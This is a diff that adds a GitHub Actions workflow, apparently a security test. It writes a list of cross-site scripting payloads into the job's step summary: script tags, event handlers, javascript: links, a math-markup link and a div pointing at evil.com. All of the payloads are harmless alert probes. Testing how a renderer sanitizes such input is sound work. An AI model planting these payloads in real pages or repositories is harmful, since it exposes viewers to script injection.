@@ -1,0 +1,24 @@
+name: Step Summary XSS Test
+on:
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write XSS payloads to step summary
+        run: |
+          cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+          ## Step Summary XSS Test
+          
+          <img src=x onerror=alert(1)>
+          
+          <script>alert(2)</script>
+          
+          <details open ontoggle=alert(3)>payload</details>
+          
+          <div action="https://evil.com" tabindex=0 accesskey="x">action div</div>
+          
+          <a href="javascript:alert(4)">click</a>
+          
+          $$\href{javascript:alert(5)}{math}$$
+          EOF
